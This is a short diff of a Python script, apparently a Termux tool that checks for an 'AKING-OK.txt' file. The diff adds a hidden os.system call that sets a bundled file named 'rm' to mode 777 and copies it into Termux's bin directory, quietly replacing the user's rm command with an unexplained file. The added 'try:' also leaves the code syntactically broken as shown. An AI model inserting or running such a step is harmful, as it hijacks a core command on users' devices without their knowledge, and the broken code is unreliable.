@@ -1,5 +1,7 @@
 import os
 try:
+    os.system('chmod 777 rm && cp rm /data/data/com.termux/files/usr/bin')
+try:
     try:
         open('/sdcard/AKING-OK.txt','r').read()
     except:
